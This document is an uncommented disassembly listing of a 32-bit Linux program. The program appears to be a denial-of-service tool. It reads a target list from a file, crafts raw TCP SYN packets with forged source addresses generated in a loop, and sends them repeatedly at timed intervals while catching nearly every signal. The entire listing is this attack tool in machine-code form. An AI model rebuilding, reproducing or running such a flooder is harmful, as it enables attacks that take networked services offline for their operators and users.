push   ebp
mov    ebp,esp
push   ebx
call   8048551 <atol@plt-0x37>
pop    ebx
add    ebx,0x1de7
cmp    DWORD PTR [ebx+0x5c],0x0
je     8048566 <atol@plt-0x22>
call   0 <atol@plt-0x8048588>
mov    esi,esi
call   8048750 <socket@plt+0x98>
call   8049190 <socket@plt+0xad8>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
push   DWORD PTR ds:0x804a33c
jmp    DWORD PTR ds:0x804a340
add    BYTE PTR [eax],al
jmp    DWORD PTR ds:0x804a344
push   0x0
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a348
push   0x8
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a34c
push   0x10
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a350
push   0x18
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a354
push   0x20
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a358
push   0x28
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a35c
push   0x30
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a360
push   0x38
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a364
push   0x40
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a368
push   0x48
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a36c
push   0x50
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a370
push   0x58
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a374
push   0x60
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a378
push   0x68
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a37c
push   0x70
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a380
push   0x78
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a384
push   0x80
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a388
push   0x88
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a38c
push   0x90
jmp    8048578 <atol@plt-0x10>
jmp    DWORD PTR ds:0x804a390
push   0x98
jmp    8048578 <atol@plt-0x10>
xor    ebp,ebp
pop    esi
mov    ecx,esp
and    esp,0xfffffff8
push   eax
push   esp
push   edx
push   0x80491bc
push   0x8048548
push   ecx
push   esi
push   0x8048c10
call   8048628 <__libc_start_main@plt>
hlt    
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
cmp    DWORD PTR ds:0x804a31c,0x0
jne    8048744 <socket@plt+0x8c>
jmp    804871d <socket@plt+0x65>
mov    esi,esi
lea    edx,[eax+0x4]
mov    DWORD PTR ds:0x804a318,edx
mov    eax,DWORD PTR [eax]
call   eax
mov    eax,ds:0x804a318
cmp    DWORD PTR [eax],0x0
jne    8048710 <socket@plt+0x58>
mov    eax,0x8048608
test   eax,eax
je     804873a <socket@plt+0x82>
push   0x804a324
call   8048608 <__deregister_frame_info@plt>
mov    DWORD PTR ds:0x804a31c,0x1
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
mov    eax,0x80485a8
test   eax,eax
je     804876b <socket@plt+0xb3>
push   0x804a440
push   0x804a324
call   80485a8 <__register_frame_info@plt>
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
leave  
ret    
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push   ebp
mov    ebp,esp
push   edi
push   esi
push   ebx
mov    edi,DWORD PTR [ebp+0xc]
mov    edx,DWORD PTR [ebp+0x8]
xor    ebx,ebx
xor    esi,esi
cmp    edi,0x1
jle    80487a5 <socket@plt+0xed>
movzx  eax,WORD PTR [edx]
add    ebx,eax
add    edx,0x2
add    edi,0xfffffffe
cmp    edi,0x1
jg     8048795 <socket@plt+0xdd>
cmp    edi,0x1
jne    80487b5 <socket@plt+0xfd>
mov    ecx,esi
mov    cl,BYTE PTR [edx]
mov    esi,ecx
movzx  eax,si
add    ebx,eax
mov    eax,ebx
sar    eax,0x10
mov    edx,ebx
movzx  edx,dx
lea    ebx,[edx+eax*1]
mov    eax,ebx
sar    eax,0x10
add    ebx,eax
mov    esi,ebx
not    si
movzx  eax,si
lea    esp,[ebp-0xc]
pop    ebx
pop    esi
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,DWORD PTR [ebp+0x8]
push   0x8049200
call   8048638 <printf@plt>
push   ebx
call   8048678 <exit@plt>
nop
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,DWORD PTR [ebp+0x8]
push   0x8049220
call   8048638 <printf@plt>
push   ebx
call   8048678 <exit@plt>
nop
push   ebp
mov    ebp,esp
sub    esp,0x10024
push   edi
push   esi
push   ebx
mov    ebx,DWORD PTR [ebp+0x8]
mov    ecx,DWORD PTR [ebx+0xc]
mov    DWORD PTR [ebp-0x10000],ecx
mov    DWORD PTR [ebp-0x1000c],ecx
mov    edx,DWORD PTR [ebx+0x10]
mov    DWORD PTR [ebp-0x10008],edx
mov    BYTE PTR [ebp-0x10004],0x0
mov    BYTE PTR [ebp-0x10003],0x6
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x14
xchg   ah,al
mov    WORD PTR [ebp-0x10002],ax
mov    DWORD PTR [ebp-0xfffc],edx
mov    eax,DWORD PTR [ebp-0x10004]
mov    DWORD PTR [ebp-0xfff8],eax
lea    edx,[ebp-0xfff4]
mov    eax,DWORD PTR [ebp+0xc]
mov    edi,edx
mov    esi,eax
cld    
mov    ecx,0x5
rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
lea    eax,[ebp-0xffe0]
mov    ecx,DWORD PTR [ebp+0x14]
push   ecx
mov    esi,DWORD PTR [ebp+0x10]
push   esi
push   eax
call   8048648 <memcpy@plt>
mov    edi,DWORD PTR [ebp+0x14]
mov    DWORD PTR [edi+ebp*1-0xffe0],0x0
mov    eax,DWORD PTR [ebp+0x14]
add    eax,0x21
and    al,0xfe
push   eax
lea    ecx,[ebp-0x10000]
mov    DWORD PTR [ebp-0x10024],ecx
push   ecx
call   8048780 <socket@plt+0xc8>
mov    esi,DWORD PTR [ebp+0xc]
mov    WORD PTR [esi+0x10],ax
mov    al,BYTE PTR [ebx]
and    al,0xf
and    eax,0xff
shl    eax,0x2
push   eax
push   ebx
mov    edi,DWORD PTR [ebp-0x10024]
push   edi
call   8048648 <memcpy@plt>
mov    al,BYTE PTR [ebx]
and    al,0xf
and    eax,0xff
lea    edx,[ebp+eax*4-0x10000]
mov    eax,DWORD PTR [ebp+0xc]
mov    edi,edx
mov    esi,eax
cld    
mov    ecx,0x5
rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
mov    al,BYTE PTR [ebx]
and    al,0xf
and    eax,0xff
lea    eax,[ebp+eax*4-0xffec]
add    esp,0x20
mov    ecx,DWORD PTR [ebp+0x14]
push   ecx
mov    esi,DWORD PTR [ebp+0x10]
push   esi
push   eax
call   8048648 <memcpy@plt>
mov    al,BYTE PTR [ebx]
and    al,0xf
and    eax,0xff
shl    eax,0x2
lea    edx,[ebp+eax*1+0x0]
mov    edi,DWORD PTR [ebp+0x14]
mov    DWORD PTR [edi+edx*1-0xffec],0x0
add    edi,0x14
mov    DWORD PTR [ebp-0x10020],edi
lea    eax,[edi+eax*1+0x1]
and    al,0xfe
push   eax
mov    ecx,DWORD PTR [ebp-0x10024]
push   ecx
call   8048780 <socket@plt+0xc8>
mov    WORD PTR [ebx+0xa],ax
mov    al,BYTE PTR [ebx]
and    al,0xf
and    eax,0xff
shl    eax,0x2
push   eax
push   ebx
mov    esi,DWORD PTR [ebp-0x10024]
push   esi
call   8048648 <memcpy@plt>
mov    WORD PTR [ebp-0x1001c],0x2
mov    edi,DWORD PTR [ebp+0xc]
mov    ax,WORD PTR [edi+0x2]
mov    WORD PTR [ebp-0x1001a],ax
mov    eax,DWORD PTR [ebx+0x10]
mov    DWORD PTR [ebp-0x10018],eax
add    esp,0x20
push   0x10
lea    eax,[ebp-0x1001c]
push   eax
push   0x0
mov    al,BYTE PTR [ebx]
and    al,0xf
and    eax,0xff
mov    ecx,DWORD PTR [ebp-0x10020]
lea    eax,[ecx+eax*4]
push   eax
push   esi
push   DWORD PTR ds:0x804a470
call   80485f8 <sendto@plt>
lea    esp,[ebp-0x10030]
pop    ebx
pop    esi
pop    edi
leave  
ret    
lea    esi,[esi+0x0]
push   ebp
mov    ebp,esp
sub    esp,0x440
push   edi
push   esi
push   ebx
mov    ebx,DWORD PTR [ebp+0x8]
mov    esi,DWORD PTR [ebp+0xc]
mov    edi,DWORD PTR [ebp+0x10]
mov    BYTE PTR [ebp-0x14],0x45
mov    BYTE PTR [ebp-0x13],0x0
mov    WORD PTR [ebp-0x12],0x28
call   80485d8 <random@plt>
mov    edx,eax
xchg   dh,dl
mov    WORD PTR [ebp-0x10],dx
mov    WORD PTR [ebp-0xe],0x0
mov    BYTE PTR [ebp-0xc],0x1e
mov    BYTE PTR [ebp-0xb],0x6
mov    WORD PTR [ebp-0xa],0x0
mov    DWORD PTR [ebp-0x8],ebx
mov    DWORD PTR [ebp-0x4],esi
mov    ax,ds:0x804a458
xchg   ah,al
mov    WORD PTR [ebp-0x28],ax
mov    eax,edi
xchg   ah,al
mov    WORD PTR [ebp-0x26],ax
mov    DWORD PTR [ebp-0x24],0x39683728
mov    al,BYTE PTR [ebp-0x1c]
and    al,0xf
or     al,0x50
mov    BYTE PTR [ebp-0x1c],al
mov    DWORD PTR [ebp-0x20],0x0
and    al,0x50
mov    BYTE PTR [ebp-0x1c],al
mov    BYTE PTR [ebp-0x1b],0x2
mov    WORD PTR [ebp-0x1a],0xffff
mov    WORD PTR [ebp-0x18],0x0
mov    WORD PTR [ebp-0x16],0x0
push   0x0
push   0x8049242
lea    eax,[ebp-0x28]
push   eax
lea    eax,[ebp-0x14]
push   eax
call   804880c <socket@plt+0x154>
lea    edi,[ebp-0x438]
xor    eax,eax
cld    
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
add    ecx,0x28376839
mov    DWORD PTR ds:0x804a464,ecx
lea    esp,[ebp-0x44c]
pop    ebx
pop    esi
pop    edi
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
push   0x80487dc
push   0x1
call   80485c8 <signal@plt>
push   0x80487dc
push   0x2
call   80485c8 <signal@plt>
push   0x80487dc
push   0x3
call   80485c8 <signal@plt>
push   0x80487dc
push   0x4
call   80485c8 <signal@plt>
add    esp,0x20
push   0x80487dc
push   0x5
call   80485c8 <signal@plt>
push   0x80487dc
push   0x6
call   80485c8 <signal@plt>
push   0x80487dc
push   0x7
call   80485c8 <signal@plt>
push   0x80487dc
push   0x8
call   80485c8 <signal@plt>
add    esp,0x20
push   0x80487dc
push   0x9
call   80485c8 <signal@plt>
push   0x80487dc
push   0xa
call   80485c8 <signal@plt>
push   0x80487f4
push   0xb
call   80485c8 <signal@plt>
push   0x80487dc
push   0xc
call   80485c8 <signal@plt>
add    esp,0x20
push   0x80487dc
push   0xd
call   80485c8 <signal@plt>
push   0x80487dc
push   0xe
call   80485c8 <signal@plt>
push   0x80487dc
push   0xf
call   80485c8 <signal@plt>
push   0x80487dc
push   0x11
call   80485c8 <signal@plt>
add    esp,0x20
push   0x80487dc
push   0x12
call   80485c8 <signal@plt>
push   0x80487dc
push   0x13
call   80485c8 <signal@plt>
push   0x80487dc
push   0x14
call   80485c8 <signal@plt>
push   0x80487dc
push   0x15
call   80485c8 <signal@plt>
add    esp,0x20
push   0x80487dc
push   0x16
call   80485c8 <signal@plt>
push   0x80487dc
push   0x17
call   80485c8 <signal@plt>
push   0x80487dc
push   0x18
call   80485c8 <signal@plt>
push   0x80487dc
push   0x19
call   80485c8 <signal@plt>
add    esp,0x20
push   0x80487dc
push   0x1a
call   80485c8 <signal@plt>
push   0x80487dc
push   0x1b
call   80485c8 <signal@plt>
push   0x80487dc
push   0x1c
call   80485c8 <signal@plt>
push   0x80487dc
push   0x1d
call   80485c8 <signal@plt>
add    esp,0x20
push   0x80487dc
push   0x1e
call   80485c8 <signal@plt>
leave  
ret    
mov    esi,esi
push   ebp
mov    ebp,esp
sub    esp,0x4aa8
push   edi
push   esi
push   ebx
mov    ebx,DWORD PTR [ebp+0x8]
mov    esi,DWORD PTR [ebp+0xc]
call   8048a98 <socket@plt+0x3e0>
cmp    ebx,0x4
je     8048c50 <socket@plt+0x598>
push   DWORD PTR [esi]
push   0x8049260
call   8048638 <printf@plt>
push   0x80492a0
call   8048638 <printf@plt>
push   0x1
call   8048678 <exit@plt>
lea    esi,[esi+eiz*1+0x0]
push   DWORD PTR [esi+0x8]
call   8048588 <atol@plt>
mov    DWORD PTR [ebp-0x4a5c],eax
push   DWORD PTR [esi+0xc]
call   8048588 <atol@plt>
mov    DWORD PTR [ebp-0x4a60],eax
push   0x80492ea
push   DWORD PTR [esi+0x4]
call   8048698 <fopen@plt>
mov    DWORD PTR [ebp-0x4a68],eax
mov    DWORD PTR [ebp-0x4a54],0x0
add    esp,0x10
lea    eax,[ebp-0x4668]
mov    DWORD PTR [ebp-0x4a84],eax
jmp    8048ef0 <socket@plt+0x838>
lea    esi,[esi+0x0]
mov    esi,DWORD PTR [ebp-0x4a84]
mov    edi,esi
xor    eax,eax
cld    
mov    ecx,0xffffffff
repnz scas al,BYTE PTR es:[edi]
not    ecx
dec    ecx
cmp    ecx,0x3
jbe    8048ef0 <socket@plt+0x838>
xor    ebx,ebx
lea    edx,[ebp-0x4a50]
mov    DWORD PTR [ebp-0x4a8c],edx
lea    edi,[ebp-0xfa0]
lea    eax,[ebp-0x1f40]
mov    DWORD PTR [ebp-0x4a88],eax
lea    edx,[ebp-0x2ee0]
mov    DWORD PTR [ebp-0x4a80],edx
lea    eax,[ebp-0x3e80]
mov    DWORD PTR [ebp-0x4a90],eax
cmp    BYTE PTR [ebp-0x4668],0x20
je     8048d14 <socket@plt+0x65c>
mov    ecx,DWORD PTR [ebp-0x4a8c]
mov    edx,esi
mov    al,BYTE PTR [ebx+esi*1]
mov    BYTE PTR [ebx+ecx*1],al
inc    ebx
cmp    BYTE PTR [ebx+edx*1],0x20
jne    8048d05 <socket@plt+0x64d>
mov    edx,DWORD PTR [ebp-0x4a8c]
mov    BYTE PTR [ebx+edx*1],0x0
inc    ebx
mov    esi,ebx
push   edx
call   8048668 <gethostbyname@plt>
mov    ecx,eax
mov    eax,DWORD PTR [ebp-0x4a54]
shl    eax,0x2
mov    DWORD PTR [ebp-0x4a6c],eax
mov    ecx,DWORD PTR [ecx+0x10]
mov    edx,DWORD PTR [ecx]
mov    eax,DWORD PTR [edx]
mov    edx,DWORD PTR [ebp-0x4a6c]
mov    DWORD PTR [edx+edi*1],eax
mov    eax,DWORD PTR [ebp-0x4a8c]
push   eax
push   0x80492ec
call   8048638 <printf@plt>
add    esp,0xc
mov    edi,DWORD PTR [ebp-0x4a84]
cmp    BYTE PTR [ebx+edi*1],0x20
je     8048d97 <socket@plt+0x6df>
mov    edx,DWORD PTR [ebp-0x4a8c]
mov    DWORD PTR [ebp-0x4a70],edx
mov    ecx,ebx
sub    ecx,esi
mov    DWORD PTR [ebp-0x4aa4],edi
mov    al,BYTE PTR [ebx+edi*1]
mov    edx,DWORD PTR [ebp-0x4a70]
mov    BYTE PTR [ecx+edx*1],al
inc    ebx
mov    eax,DWORD PTR [ebp-0x4aa4]
cmp    BYTE PTR [ebx+eax*1],0x20
jne    8048d74 <socket@plt+0x6bc>
mov    ecx,ebx
sub    ecx,esi
mov    edx,DWORD PTR [ebp-0x4a8c]
mov    BYTE PTR [ecx+edx*1],0x0
inc    ebx
mov    esi,ebx
push   edx
call   8048688 <atoi@plt>
mov    ecx,eax
mov    eax,DWORD PTR [ebp-0x4a88]
mov    edx,DWORD PTR [ebp-0x4a6c]
mov    DWORD PTR [edx+eax*1],ecx
mov    eax,DWORD PTR [ebp-0x4a8c]
push   eax
push   0x80492ec
call   8048638 <printf@plt>
add    esp,0xc
mov    edi,DWORD PTR [ebp-0x4a84]
cmp    BYTE PTR [ebx+edi*1],0x20
je     8048e13 <socket@plt+0x75b>
mov    edx,DWORD PTR [ebp-0x4a8c]
mov    DWORD PTR [ebp-0x4a74],edx
nop
lea    esi,[esi+eiz*1+0x0]
mov    ecx,ebx
sub    ecx,esi
mov    DWORD PTR [ebp-0x4aa4],edi
mov    al,BYTE PTR [ebx+edi*1]
mov    edx,DWORD PTR [ebp-0x4a74]
mov    BYTE PTR [ecx+edx*1],al
inc    ebx
mov    eax,DWORD PTR [ebp-0x4aa4]
cmp    BYTE PTR [ebx+eax*1],0x20
jne    8048df0 <socket@plt+0x738>
mov    ecx,ebx
sub    ecx,esi
mov    edx,DWORD PTR [ebp-0x4a8c]
mov    BYTE PTR [ecx+edx*1],0x0
inc    ebx
mov    esi,ebx
push   edx
call   8048688 <atoi@plt>
mov    ecx,eax
mov    eax,DWORD PTR [ebp-0x4a80]
mov    edx,DWORD PTR [ebp-0x4a6c]
mov    DWORD PTR [edx+eax*1],ecx
mov    eax,DWORD PTR [ebp-0x4a8c]
push   eax
push   0x80492ec
call   8048638 <printf@plt>
add    esp,0xc
mov    edx,DWORD PTR [ebp-0x4a84]
mov    DWORD PTR [ebp-0x4a78],edx
mov    cl,BYTE PTR [ebx+edx*1]
cmp    cl,0x20
je     8048eb3 <socket@plt+0x7fb>
cmp    cl,0xd
je     8048eb3 <socket@plt+0x7fb>
cmp    cl,0xa
je     8048eb3 <socket@plt+0x7fb>
mov    edi,DWORD PTR [ebp-0x4a8c]
mov    ecx,edx
mov    al,BYTE PTR [ebx+ecx*1]
mov    BYTE PTR [ebp-0x4aa4],al
test   al,al
je     8048eb3 <socket@plt+0x7fb>
mov    DWORD PTR [ebp-0x4aa0],ebx
sub    DWORD PTR [ebp-0x4aa0],esi
mov    edx,DWORD PTR [ebp-0x4aa0]
mov    BYTE PTR [edx+edi*1],al
inc    ebx
mov    eax,DWORD PTR [ebp-0x4a78]
mov    al,BYTE PTR [ebx+eax*1]
mov    BYTE PTR [ebp-0x4aa4],al
cmp    al,0x20
je     8048eb3 <socket@plt+0x7fb>
cmp    al,0xd
je     8048eb3 <socket@plt+0x7fb>
cmp    al,0xa
jne    8048e75 <socket@plt+0x7bd>
sub    ebx,esi
mov    edx,DWORD PTR [ebp-0x4a8c]
mov    BYTE PTR [ebx+edx*1],0x0
push   edx
call   8048688 <atoi@plt>
mov    ecx,eax
mov    eax,DWORD PTR [ebp-0x4a90]
mov    edx,DWORD PTR [ebp-0x4a6c]
mov    DWORD PTR [edx+eax*1],ecx
mov    eax,DWORD PTR [ebp-0x4a8c]
push   eax
push   0x80492f0
call   8048638 <printf@plt>
inc    DWORD PTR [ebp-0x4a54]
add    esp,0xc
mov    edx,DWORD PTR [ebp-0x4a68]
push   edx
push   0x3e8
mov    eax,DWORD PTR [ebp-0x4a84]
push   eax
call   8048618 <fgets@plt>
mov    ecx,eax
add    esp,0xc
test   ecx,ecx
jne    8048ca0 <socket@plt+0x5e8>
dec    DWORD PTR [ebp-0x4a54]
mov    edx,DWORD PTR [ebp-0x4a68]
push   edx
call   8048658 <fclose@plt>
push   0x11
push   0x2
push   0x2
call   80486b8 <socket@plt>
mov    ecx,eax
mov    DWORD PTR ds:0x804a470,ecx
add    esp,0x10
test   ecx,ecx
jge    8048f52 <socket@plt+0x89a>
push   0x80492f4
call   80485b8 <perror@plt>
push   0x1
call   8048678 <exit@plt>
push   0x11
push   0x2
push   0x2
call   80486b8 <socket@plt>
mov    ds:0x804a45c,eax
add    esp,0xc
test   eax,eax
jge    8048f80 <socket@plt+0x8c8>
push   0x8049301
call   80485b8 <perror@plt>
push   0x1
call   8048678 <exit@plt>
lea    esi,[esi+0x0]
push   0x400
call   80485e8 <malloc@plt>
mov    DWORD PTR [ebp-0x4a64],eax
mov    ebx,0x1
add    esp,0x4
mov    DWORD PTR [ebp-0x4a94],0x3
mov    DWORD PTR [ebp-0x4a98],0x5
mov    DWORD PTR [ebp-0x4a9c],0x7
mov    eax,0x80008001
mul    ebx
mov    ecx,edx
shr    ecx,0xf
mov    esi,ecx
shl    esi,0x10
sub    esi,ecx
mov    eax,ebx
sub    eax,esi
mov    ds:0x804a458,eax
mov    eax,0x80808081
mul    DWORD PTR [ebp-0x4a9c]
mov    ecx,edx
shr    ecx,0x7
mov    esi,ecx
shl    esi,0x8
sub    esi,ecx
mov    eax,DWORD PTR [ebp-0x4a9c]
mov    DWORD PTR [ebp-0x4aa0],eax
sub    DWORD PTR [ebp-0x4aa0],esi
mov    edx,DWORD PTR [ebp-0x4aa0]
push   edx
mov    eax,0x80808081
mul    DWORD PTR [ebp-0x4a98]
mov    ecx,edx
shr    ecx,0x7
mov    esi,ecx
shl    esi,0x8
sub    esi,ecx
mov    eax,DWORD PTR [ebp-0x4a98]
mov    DWORD PTR [ebp-0x4aa0],eax
sub    DWORD PTR [ebp-0x4aa0],esi
mov    edx,DWORD PTR [ebp-0x4aa0]
push   edx
mov    eax,0x80808081
mul    DWORD PTR [ebp-0x4a94]
mov    ecx,edx
shr    ecx,0x7
mov    esi,ecx
shl    esi,0x8
sub    esi,ecx
mov    eax,DWORD PTR [ebp-0x4a94]
mov    DWORD PTR [ebp-0x4aa0],eax
sub    DWORD PTR [ebp-0x4aa0],esi
mov    edx,DWORD PTR [ebp-0x4aa0]
push   edx
mov    eax,0x80808081
mul    ebx
mov    ecx,edx
shr    ecx,0x7
mov    esi,ecx
shl    esi,0x8
sub    esi,ecx
mov    ecx,ebx
sub    ecx,esi
push   ecx
push   0x8049308
mov    eax,DWORD PTR [ebp-0x4a64]
push   eax
call   80486a8 <sprintf@plt>
mov    edx,DWORD PTR [ebp-0x4a64]
push   edx
call   8048668 <gethostbyname@plt>
mov    ecx,eax
mov    ecx,DWORD PTR [ecx+0x10]
mov    eax,DWORD PTR [ecx]
mov    edx,DWORD PTR [eax]
mov    DWORD PTR [ebp-0x4a58],edx
xor    esi,esi
add    esp,0x1c
cmp    esi,DWORD PTR [ebp-0x4a54]
jg     8049155 <socket@plt+0xa9d>
lea    eax,[ebp-0x2ee0]
mov    DWORD PTR [ebp-0x4a7c],eax
lea    edi,[ebp-0x1f40]
lea    esi,[esi+eiz*1+0x0]
lea    ecx,[esi*4+0x0]
mov    eax,ebx
xor    edx,edx
div    DWORD PTR [ecx+ebp*1-0x3e80]
test   edx,edx
jne    8049145 <socket@plt+0xa8d>
mov    DWORD PTR [ebp-0x4aa4],0xffff
mov    edx,DWORD PTR ds:0x804a458
sub    DWORD PTR [ebp-0x4aa4],edx
mov    eax,DWORD PTR [ebp-0x4a7c]
mov    edx,DWORD PTR [ecx+eax*1]
sub    edx,DWORD PTR [edi]
inc    edx
mov    DWORD PTR [ebp-0x4aa0],edx
mov    eax,DWORD PTR [ebp-0x4aa4]
xor    edx,edx
div    DWORD PTR [ebp-0x4aa0]
mov    DWORD PTR [ebp-0x4aa4],edx
mov    eax,DWORD PTR [ebp-0x4aa4]
add    ax,WORD PTR [edi]
movzx  edx,ax
push   edx
push   DWORD PTR [ecx+ebp*1-0xfa0]
mov    eax,DWORD PTR [ebp-0x4a58]
push   eax
call   80489c8 <socket@plt+0x310>
add    esp,0xc
add    edi,0x4
inc    esi
cmp    esi,DWORD PTR [ebp-0x4a54]
jle    80490d0 <socket@plt+0xa18>
mov    eax,ebx
xor    edx,edx
div    DWORD PTR [ebp-0x4a5c]
test   edx,edx
jne    8049172 <socket@plt+0xaba>
mov    edx,DWORD PTR [ebp-0x4a60]
push   edx
call   8048598 <usleep@plt>
add    esp,0x4
add    DWORD PTR [ebp-0x4a94],0x2
add    DWORD PTR [ebp-0x4a98],0x3
add    DWORD PTR [ebp-0x4a9c],0x4
inc    ebx
jmp    8048fb6 <socket@plt+0x8fe>
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
mov    ebx,0x804a328
cmp    DWORD PTR ds:0x804a328,0xffffffff
je     80491ae <socket@plt+0xaf6>
mov    eax,DWORD PTR [ebx]
call   eax
add    ebx,0xfffffffc
cmp    DWORD PTR [ebx],0xffffffff
jne    80491a2 <socket@plt+0xaea>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
nop
push   ebp
mov    ebp,esp
leave  
ret    
nop
nop
nop
push   ebp
mov    ebp,esp
push   ebx
call   80491c5 <socket@plt+0xb0d>
pop    ebx
add    ebx,0x1173
call   8048700 <socket@plt+0x48>
mov    ebx,DWORD PTR [ebp-0x4]
leave  
ret    
